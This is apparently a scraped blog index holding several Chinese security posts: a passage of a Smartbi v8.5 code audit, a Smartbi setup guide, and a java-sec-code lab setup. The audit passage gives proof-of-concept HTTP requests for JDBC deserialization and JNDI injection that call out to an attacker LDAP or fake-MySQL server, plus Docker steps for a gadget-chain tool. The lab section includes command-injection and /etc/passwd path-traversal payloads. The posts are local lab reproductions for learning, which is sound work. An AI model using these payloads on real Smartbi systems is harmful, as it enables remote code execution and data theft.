\u0026#34;?useServerPrepStmts=true\u0026amp;useOldAliasMetadataBehavior=true\u0026amp;useUnicode=true\u0026amp;characterEncoding=\u0026#34; + dbEncoding; } } break; case MSSQL: ...... 漏洞点产生在 translateDriverInfo ，此处可以拼接恶意数据库\n漏洞复现： 构造POC：\ntext\r1 type=sqldictsync\u0026amp;dbNameOnly=false\u0026amp;dbType=MYSQL\u0026amp;dbServer=[本机IP]:3308\u0026amp;dbName=d5a442d?detectCustomCollations=true\u0026amp;autoDeserialize=yes text\r1 2 3 4 5 6 7 POST /smartbi/vision/SyncServlet HTTP/1.1 Host: localhost:18080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Content-Type: application/x-www-form-urlencoded; Content-Length: 138 type=sqldictsync\u0026amp;dbNameOnly=false\u0026amp;dbType=MYSQL\u0026amp;dbServer=[本机IP]:3308\u0026amp;dbName=d5a442d?detectCustomCollations=true%26autoDeserialize=yes 同样的，开启3308端口，搭建FakeMysql服务器，生成K1链\n成功利用：\nJNDI注入 漏洞分析： Java\r1 2 3 4 5 6 //如果数据库连接url是以JDNI开头 if (info.getUrl().startsWith(\u0026#34;JNDI:\u0026#34;)) { InitialContext cxt = new InitialContext(); //去掉 JNDI 部分，保留后边部分，然后用 cxt.lookup 查找并返回 DataSource DataSource dataSource = (DataSource)cxt.lookup(info.getUrl().substring(\u0026#34;JNDI:\u0026#34;.length())); return dataSource.getConnection(); 漏洞复现： POC：\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 POST /smartbi/vision/RMIServlet HTTP/1.1 Host: localhost:18080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Content-Type: application/x-www-form-urlencoded;charset=UTF-8 Accept: */* Origin: http://127.0.0.1 Referer: http://127.0.0.1:18080/smartbi/vision/index.jsp Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=5E67682266D39E9F1475ADA74B62E102 Connection : keep-alive Content-Length: 466 className=DataSourceService\u0026amp;methodName=testConnection\u0026amp;params=[{\u0026#34;password\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;maxConnection\u0026#34;%3a100,\u0026#34;user\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;driverType\u0026#34;%3a\u0026#34;MYSQL\u0026#34;,\u0026#34;validationQuery\u0026#34;%3a\u0026#34;SELECT+1+FROM+DUAL\u0026#34;,\u0026#34;url\u0026#34;%3a\u0026#34;JNDI:ldap://[ip]:15089/bb4e07\u0026#34;,\u0026#34;name\u0026#34;%3a\u0026#34;JDBC\u0026#34;,\u0026#34;driver\u0026#34;%3a\u0026#34;com.mysql.jdbc.Driver\u0026#34;,\u0026#34;id\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;desc\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;alias\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;dbCharset\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;identifierQuoteString\u0026#34;%3a\u0026#34;`\u0026#34;,\u0026#34;transactionIsolation\u0026#34;%3a-1,\u0026#34;validationQueryMethod\u0026#34;%3a0,\u0026#34;dbToCharset\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;authenticationType\u0026#34;%3a\u0026#34;STATIC\u0026#34;}] className=DataSourceService\u0026amp;methodName=testConnection\u0026amp;params=[{\u0026#34;password\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;maxConnection\u0026#34;%3a100,\u0026#34;user\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;driverType\u0026#34;%3a\u0026#34;MYSQL\u0026#34;,\u0026#34;validationQuery\u0026#34;%3a\u0026#34;SELECT+1+FROM+DUAL\u0026#34;,\u0026#34;url\u0026#34;%3a\u0026#34;JNDI:ldap://9sjhyp.dnslog.cn\u0026#34;,\u0026#34;name\u0026#34;%3a\u0026#34;JDBC\u0026#34;,\u0026#34;driver\u0026#34;%3a\u0026#34;com.mysql.jdbc.Driver\u0026#34;,\u0026#34;id\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;desc\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;alias\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;dbCharset\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;identifierQuoteString\u0026#34;%3a\u0026#34;`\u0026#34;,\u0026#34;transactionIsolation\u0026#34;%3a-1,\u0026#34;validationQueryMethod\u0026#34;%3a0,\u0026#34;dbToCharset\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;authenticationType\u0026#34;%3a\u0026#34;STATIC\u0026#34;}] 生成K1链：\nldap://[ip]:15089/bb4e07\n这里因为端口的问题没有利用成功。报错LDAP服务器未响应\nWindows 系统将 50389 端口作为排除范围，不允许程序（包括 Docker）绑定使用它。安装JavaChains 时将 -p 50389:50389 ^改成了 -p 15089:50389 ^，可能监听不到，\n使用dnslog\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 POST /smartbi/vision/RMIServlet HTTP/1.1 Host: localhost:18080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36 Content-Type: application/x-www-form-urlencoded;charset=UTF-8 Accept: */* Origin: http://localhost Referer: http://localhost:18080/smartbi/vision/index.jsp Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=3D904649DC50813C9D6EDEBC582EE4CF Connection : keep-alive Content-Length: 457 className=DataSourceService\u0026amp;methodName=testConnection\u0026amp;params=[{\u0026#34;password\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;maxConnection\u0026#34;%3a100,\u0026#34;user\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;driverType\u0026#34;%3a\u0026#34;MYSQL\u0026#34;,\u0026#34;validationQuery\u0026#34;%3a\u0026#34;SELECT+1+FROM+DUAL\u0026#34;,\u0026#34;url\u0026#34;%3a\u0026#34;JNDI:ldap://9sjhyp.dnslog.cn\u0026#34;,\u0026#34;name\u0026#34;%3a\u0026#34;JDBC\u0026#34;,\u0026#34;driver\u0026#34;%3a\u0026#34;com.mysql.jdbc.Driver\u0026#34;,\u0026#34;id\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;desc\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;alias\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;dbCharset\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;identifierQuoteString\u0026#34;%3a\u0026#34;`\u0026#34;,\u0026#34;transactionIsolation\u0026#34;%3a-1,\u0026#34;validationQueryMethod\u0026#34;%3a0,\u0026#34;dbToCharset\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;authenticationType\u0026#34;%3a\u0026#34;STATIC\u0026#34;}] className=DataSourceService\u0026amp;methodName=testConnection\u0026amp;params=[{\u0026#34;password\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;maxConnection\u0026#34;%3a100,\u0026#34;user\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;driverType\u0026#34;%3a\u0026#34;MYSQL\u0026#34;,\u0026#34;validationQuery\u0026#34;%3a\u0026#34;SELECT+1+FROM+DUAL\u0026#34;,\u0026#34;url\u0026#34;%3a\u0026#34;JNDI:ldap://192.168.1.25:15089/547b87\u0026#34;,\u0026#34;name\u0026#34;%3a\u0026#34;JDBC\u0026#34;,\u0026#34;driver\u0026#34;%3a\u0026#34;com.mysql.jdbc.Driver\u0026#34;,\u0026#34;id\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;desc\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;alias\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;dbCharset\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;identifierQuoteString\u0026#34;%3a\u0026#34;`\u0026#34;,\u0026#34;transactionIsolation\u0026#34;%3a-1,\u0026#34;validationQueryMethod\u0026#34;%3a0,\u0026#34;dbToCharset\u0026#34;%3a\u0026#34;\u0026#34;,\u0026#34;authenticationType\u0026#34;%3a\u0026#34;STATIC\u0026#34;}] ldap://192.168.1.25:15089/b69569\n收到DNSLOG记录，说明漏洞存在\n参考文章： CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析\nhttps://www.cnblogs.com/backlion/p/12870365.html\nSmartbi 身份认证绕过漏洞\nhttps://www.freebuf.com/vuls/373015.html\n信息搜集相关：\nhttps://ckcah.github.io/2020/05/01/googlehack/\nhttps://94248.github.io/2023/07/25/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9B%B8%E5%85%B3/\nservlet\nhttps://86263008.github.io/web2024/back/java/jsp/servlet/index.html\nhttps://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11\nhttps://blog.csdn.net/yxmoar/article/details/109889006\nJDBC反序列化学习\nhttps://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/\nhttps://xz.aliyun.com/news/7754\nhttps://www.cnblogs.com/Litsasuk/articles/18410624\nhttps://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html\njavachains使用 https://java-chains.vulhub.org/zh/\ntext\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # docker 搭建 docker pull javachains/javachains:latest docker run -d ^ --name java-chains ^ --restart=always ^ -p 8011:8011 ^ -p 58080:58080 ^ -p 15089:50389 ^ -p 3308:3308 ^ -p 13999:13999 ^ -p 50000:50000 ^ -p 11527:11527 ^ -e CHAINS_AUTH=true ^ -e CHAINS_PASS= ^ javachains/javachains:latest #查看当前正在运行的容器 docker ps #查找日志中包含关键词 password 的行 docker logs java-chains | findstr password \u0026gt;08-02 08:06:01.144 INFO [main] c.a.c.w.c.SecurityConfig | | password: HDVhxC2MfhKJwcAN #停止 docker stop java-chains #删除 docker rm java-chains Windows 系统将 50389 端口作为排除范围，不允许程序（包括 Docker）绑定使用它。如果改端口可能有一些问题，还是尽量在Linux搭可以避免端口问题。\n访问 localhost:8011\n密码：docker logs java-chains | findstr password\n","permalink":"http://localhost:1313/xvsf/posts/smartbi-v8.5-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","summary":"\u003ch1 id=\"smartbi-v85-代码审计\"\u003eSmartbi v8.5 代码审计\u003c/h1\u003e\n\u003ch1 id=\"目录结构\"\u003e目录结构\u003c/h1\u003e\n\u003cdiv class=\"code-block-container\" data-expanded=\"true\"\u003e\r\n    \u003cdiv class=\"code-header\"\u003e\r\n        \u003cdiv class=\"mac-buttons\"\u003e\r\n            \u003cspan class=\"mac-button red\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button yellow\"\u003e\u003c/span\u003e\r\n            \u003cspan class=\"mac-button green\"\u003e\u003c/span\u003e\r\n        \u003c/div\u003e\r\n        \u003cspan class=\"code-language\"\u003etext\u003c/span\u003e\r\n        \u003cdiv class=\"code-actions\"\u003e\r\n            \u003cbutton class=\"copy-btn\" title=\"Copy\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"\u003e\u003crect x=\"9\" y=\"9\" width=\"13\" height=\"13\" rx=\"2\" ry=\"2\"\u003e\u003c/rect\u003e\u003cpath d=\"M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1\"\u003e\u003c/path\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n            \u003cbutton class=\"toggle-btn\" title=\"Toggle\"\u003e\r\n                \u003csvg xmlns=\"http://www.w3.org/2000/svg\" width=\"16\" height=\"16\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"feather feather-chevron-down\"\u003e\u003cpolyline points=\"6 9 12 15 18 9\"\u003e\u003c/polyline\u003e\u003c/svg\u003e\r\n            \u003c/button\u003e\r\n        \u003c/div\u003e\r\n    \u003c/div\u003e\r\n    \u003cdiv class=\"code-content\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cdiv class=\"chroma\"\u003e\n\u003ctable class=\"lntable\"\u003e\u003ctr\u003e\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode\u003e\u003cspan class=\"lnt\" id=\"1\"\u003e\u003ca class=\"lnlinks\" href=\"#1\"\u003e 1\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"2\"\u003e\u003ca class=\"lnlinks\" href=\"#2\"\u003e 2\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"3\"\u003e\u003ca class=\"lnlinks\" href=\"#3\"\u003e 3\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"4\"\u003e\u003ca class=\"lnlinks\" href=\"#4\"\u003e 4\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"5\"\u003e\u003ca class=\"lnlinks\" href=\"#5\"\u003e 5\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"6\"\u003e\u003ca class=\"lnlinks\" href=\"#6\"\u003e 6\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"7\"\u003e\u003ca class=\"lnlinks\" href=\"#7\"\u003e 7\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"8\"\u003e\u003ca class=\"lnlinks\" href=\"#8\"\u003e 8\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"9\"\u003e\u003ca class=\"lnlinks\" href=\"#9\"\u003e 9\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"10\"\u003e\u003ca class=\"lnlinks\" href=\"#10\"\u003e10\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"11\"\u003e\u003ca class=\"lnlinks\" href=\"#11\"\u003e11\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"12\"\u003e\u003ca class=\"lnlinks\" href=\"#12\"\u003e12\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"13\"\u003e\u003ca class=\"lnlinks\" href=\"#13\"\u003e13\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"14\"\u003e\u003ca class=\"lnlinks\" href=\"#14\"\u003e14\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"15\"\u003e\u003ca class=\"lnlinks\" href=\"#15\"\u003e15\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"16\"\u003e\u003ca class=\"lnlinks\" href=\"#16\"\u003e16\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"17\"\u003e\u003ca class=\"lnlinks\" href=\"#17\"\u003e17\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"18\"\u003e\u003ca class=\"lnlinks\" href=\"#18\"\u003e18\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"19\"\u003e\u003ca class=\"lnlinks\" href=\"#19\"\u003e19\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"20\"\u003e\u003ca class=\"lnlinks\" href=\"#20\"\u003e20\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"21\"\u003e\u003ca class=\"lnlinks\" href=\"#21\"\u003e21\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"22\"\u003e\u003ca class=\"lnlinks\" href=\"#22\"\u003e22\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"23\"\u003e\u003ca class=\"lnlinks\" href=\"#23\"\u003e23\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"24\"\u003e\u003ca class=\"lnlinks\" href=\"#24\"\u003e24\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"25\"\u003e\u003ca class=\"lnlinks\" href=\"#25\"\u003e25\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"26\"\u003e\u003ca class=\"lnlinks\" href=\"#26\"\u003e26\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"27\"\u003e\u003ca class=\"lnlinks\" href=\"#27\"\u003e27\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"28\"\u003e\u003ca class=\"lnlinks\" href=\"#28\"\u003e28\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"29\"\u003e\u003ca class=\"lnlinks\" href=\"#29\"\u003e29\u003c/a\u003e\n\u003c/span\u003e\u003cspan class=\"lnt\" id=\"30\"\u003e\u003ca class=\"lnlinks\" href=\"#30\"\u003e30\u003c/a\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd class=\"lntd\"\u003e\n\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eE:.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e├─Infobright\t用于分析型数据存储\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e├─jdk\tJava 开发环境\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e├─MySQL\t\t数据库服务\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e├─SmartbiUnionServer\tSmartbi 的 Union Server 模块（Presto 引擎相关）\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e├─smartbixmla\t\tSmartbi XMLA 接口模块，主要用于与外部如 Excel 的数据透视表通信\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e└─Tomcat\tSmartbi 使用的 Web 应用服务器，部署了核心 web 模块和插件扩展\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ├─bin\t包含Tomcat的启动/关闭脚本、Smartbi 的配置文件、运行日志\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    |   |  exts-smartbi\t\t扩展模块\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    |\t|  Index-smartbi\t搜索索引\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    |\t|  mlogs-smartbi\t模块级别日志\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    |\t|  SmartbiX-ExtractData\t 数据导出模块\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    |   |  smartbi_repoBackup\t仓库备份\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    |\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ├─conf\t配置文件所在\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e   \t|\t│  catalina.policy\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t|\t│  catalina.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t|\t│  context.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t|\t│  logging.properties\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t|\t│  server.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t|\t│  tomcat-users.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t|\t│  web.xml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t|\t│\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t|\t└─Catalina\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    |\t\t\t└─localhost\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ├─lib\t包含Tomcat运行所需的JAR库文件\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ├─logs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ├─temp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ├─webapps\t实际部署的Web应用程序\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    ├─work\t Tomcat 运行时自动生成的 JSP 编译缓存\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003c/div\u003e\r\n\u003c/div\u003e\u003cp\u003e在找源码的过程中，看到该系统使用了 Servlet 框架，理解 Servlet 框架对后续的代码理解有帮助\u003c/p\u003e","title":"Smartbi v8.5 代码审计"},{"content":"Smartbi v8.5 环境搭建 一、安装 通过网盘分享的文件：Smartbi Insight Edition-2018-11-22.zip 链接: https://pan.baidu.com/s/15caJ59nCdUvNJcwwGx_VJQ 提取码: wan4\n用户名和公司名称随意\n更改安装目录\n此处，不要选择“安装演示库”，否则会报“报表数量超过限制”的错误\n不选择“注册为Windows服务”，内存大小默认即可\n登录首页的密码\n二、license获取 官网地址：https://www.smartbi.com.cn/\nlicense申请地址：https://my.smartbi.com.cn/index/index/customerindex/form_id/3.html\n这里第一次进入需要注册\\登录：\n之后便可以申请了，邮箱要填正确，之后会将 license 发到邮箱里\n选择个人版\n之后在邮箱里可以看到发的：Smartbi-License.xml\n获取 licence 后，将其放置在 E:\\Smartbi\\Tomcat\\bin文件夹下 三、创建数据库 首先连接 Smartbi ：\n创建Smartbi 数据库：\n第一步连接好之后，是没有 smartbi 数据库的，需要自己创建\n下面是 MySQL 的配置：\ndatabase-name 在选择安装“演示数据库”时是：smartbidemo；咋们没有选择，所以默认是：smartbi。\nE:\\Smartbi\\Tomcat\\bin\\smartbi-config.xml\n四、解决浏览器版本误判 这一步可以看下面问题中的 1、\n五、启动程序 方法一： E:\\Smartbi\\Tomcat\\bin\\startup.cmd\n运行 startup.cmd ，启动服务器\n方法二： 系统开始菜单中找到 Smartbi 的安装目录，单击启动Smartbi服务\n没有报错的话，就是启动成功了，\n若到这一步服务启动有错，重启电脑！！！\n六、配置程序 访问Smartbi:\n首次访问，需输入密码，这里的密码随意，我的是 admin\n接下来的配置按照图中所示即可：\n七、进入主页 重启服务后，再次点击访问Smartbi，会进入下方页面：\nhttp://localhost:18080/smartbi/vision/index.jsp\n首次访问登录页：\n此处的旧密码是manager，之后自行修改一个新密码：\n这是之后访问登录页：\n登录系统：\n至此，Smartbi v8.5 环境搭建完成。\n搭建时遇到的问题（按照上述方法安装后应该不会有下列问题）： 1、浏览器版本被错误检测 参考：https://www.xiaoheiwoo.com/windows-11-internet-explorer/\n方法一：从“管理加载项”窗口打开 Internet Explorer 用过 IE浏览器的人应该知道，IE中是可以通过 Internet属性 窗口，对浏览器进行功能设置的。\n虽然 Win11默认找不到 IE的入口，但是 Internet属性 程序依然可以正常运行，我们可以点击其中的 管理加载项 功能，打开 IE 浏览器。\n步骤是：\n首先，按 Win + R 打开运行窗口 接下来，在运行命令框中输入 inetcpl.cpl 单击 确定 进入 Internet 属性窗口 选择 程序 选项卡，点击 管理加载项 按钮 然后，点击窗口底部 了解有关工具栏和扩展的详细信息 铛铛铛，你要的 IE浏览器出现啦~ 方法二：注释掉判断语句 进入 E:\\Smartbi\\Tomcat\\webapps\\smartbi\\vision\n找到文件 config.jsp\n将判断部分注释掉\n2、报表数量超过限制 07-29 20:27:27 ERROR activate(smartbi.framework.Framework:85) - 报表数量超过限制 报表数量超过限制:ReportCount:452\u0026gt;20\n这个问题是由于安装时选择了安装演示数据库 ，不安装即可。\n","permalink":"http://localhost:1313/xvsf/posts/smartbi-v8.5-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","summary":"\u003ch1 id=\"smartbi-v85-环境搭建\"\u003eSmartbi v8.5 环境搭建\u003c/h1\u003e\n\u003ch2 id=\"一安装\"\u003e一、安装\u003c/h2\u003e\n\u003cp\u003e通过网盘分享的文件：Smartbi Insight Edition-2018-11-22.zip\n链接: \u003ca href=\"https://pan.baidu.com/s/15caJ59nCdUvNJcwwGx_VJQ\"\u003ehttps://pan.baidu.com/s/15caJ59nCdUvNJcwwGx_VJQ\u003c/a\u003e 提取码: wan4\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"20250730142614982\" decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207593.png\" style=\"max-width: 100%; height: auto;\"\u003e\u003c/p\u003e\n\u003cp\u003e用户名和公司名称随意\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"20250730142606223\" decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207797.png\" style=\"max-width: 100%; height: auto;\"\u003e\u003c/p\u003e\n\u003cp\u003e更改安装目录\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"20250730142705002\" decoding=\"async\" loading=\"lazy\" src=\"https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508072207535.png\" style=\"max-width: 100%; height: auto;\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e此处，不要选择“安装演示库”，否则会报“报表数量超过限制”的错误\u003c/strong\u003e\u003c/p\u003e","title":"Smartbi v8.5 环境搭建"},{"content":"java-sec-code 靶场 一、靶场环境 源码地址：\nhttps://github.com/JoyChou93/java-sec-code\n搭建环境：\nIDEA，pache-maven-3.9.1，apache-tomcat-9.0.105，JDK 1.8，MySQL 5.7.26，\n​\t数据库：小皮面板自带的MySQL，导入sql文件\n​\t修改数据库密码\n​\t默认端口为8080，如果被占用，在 application.properties 中写入 server.port=8081\n之后启动 Maven install\n运行 Application.java\n访问 127.0.0.1:8081\n搭建成功\n以下是一些小的改动：\n参考文章：https://www.freebuf.com/articles/web/289863.html\n因为项目作者选择的工作环境为linux操作系统，而我本人选择的工作环境为windows操作系统，所以为了部分功能运行成功需要修改几处源码，首先修改CommandInject.java文件下的源码，将sh执行命令替换为cmd命令，还有修改源码中一些其它的linux操作系统上独有的命令。\nsrc/main/java/org/joychou/controller/CommandInject.java java\r1 2 //String[] cmdList = new String[]{\u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;ls -la \u0026#34; + filepath}; String[] cmdList = new String[]{\u0026#34;cmd.exe\u0026#34;, \u0026#34;/c\u0026#34;, \u0026#34;dir \u0026#34; + filepath}; src/main/resources/templates/index.html html\r1 2 3 4 5 6 7 8 \u0026lt;!-- \u0026lt;a th:href=\u0026#34;@{/codeinject?filepath=/tmp;cat /etc/passwd}\u0026#34;\u0026gt;CmdInject\u0026lt;/a\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;--\u0026gt; \u0026lt;a th:href=\u0026#34;@{/codeinject?filepath=.%26ipconfig}\u0026#34;\u0026gt;CmdInject\u0026lt;/a\u0026gt; \u0026lt;!-- \u0026lt;a th:href=\u0026#34;@{/path_traversal/vul?filepath=../../../../../etc/passwd}\u0026#34;\u0026gt;PathTraversal\u0026lt;/a\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;--\u0026gt; \u0026lt;a th:href=\u0026#34;@{/path_traversal/vul?filepath=D:/test.txt}\u0026#34;\u0026gt;PathTraversal\u0026lt;/a\u0026gt; \u0026lt;!-- \u0026lt;a th:href=\u0026#34;@{/ssrf/urlConnection/vuln?url=file:///etc/passwd}\u0026#34;\u0026gt;SSRF\u0026lt;/a\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp;--\u0026gt; \u0026lt;a th:href=\u0026#34;@{/ssrf/urlConnection/vuln?url=file:///D:/test.txt}\u0026#34;\u0026gt;SSRF\u0026lt;/a\u0026gt; 二、漏洞复现 Actuators to RCE CORS 